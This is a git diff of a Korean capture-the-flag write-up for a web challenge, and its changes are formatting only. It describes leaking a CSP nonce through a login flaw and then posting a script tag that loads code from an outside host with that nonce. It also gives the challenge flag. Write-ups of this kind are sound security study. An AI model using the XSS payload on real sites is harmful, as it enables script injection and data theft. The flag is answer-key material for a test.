@@ -337,11 +337,11 @@ router.get('/view/:uuid', (req, res, next) => {
 ```
 딱 보자마자, **nonce**를 얻어야 한다는 것을 알 수 있다.
 여기서 **nonce**를 얻는 방법이 두가지가 있다.
-1. **css injection**을 통한 **nonce** leak (csp를 보면 이게 인텐인 것 같기도 하다.)
-2. 계정 로그인 관련 취약점을 통한 **nonce** leak
+1. **css injection**을 통한 **nonce leak** (csp를 보면 이게 인텐인 것 같기도 하다.)
+2. 계정 로그인 관련 취약점을 통한 **nonce leak**
 난 2번 방법을 사용해 **nonce**를 얻었다.
 **auth** 관련 코드를 보면, id와 pw의 타입 검증 없이 그대로 바인딩하고 있는 것을 알 수 있다.
-이는, 유사 **sql injection**이 가능해진다.[^1]
+이는, **sql injection**이 가능해진다.
 ```javascript
 passport.use(
 	new Strategy(function (req, cb) {
@@ -408,9 +408,9 @@ app.listen(3000, '0.0.0.0', () => {
 	console.log('Server started on http://0.0.0.0:3000')
 })
 ```
-그리고, `<script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44'></script>`를 `content`에 넣고 `post`하면 된다.
+그리고, **<script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44'></script>**를 **content**에 넣고 **post**하면 된다.
 ![img2](img2.png)
-`flag{471c6236d52f164df2b5ff324bb351ee6935715d9a102a386022430b220f8072vxxwcj1zzg}`
+**flag{471c6236d52f164df2b5ff324bb351ee6935715d9a102a386022430b220f8072vxxwcj1zzg}**
 
 ## Misc
 
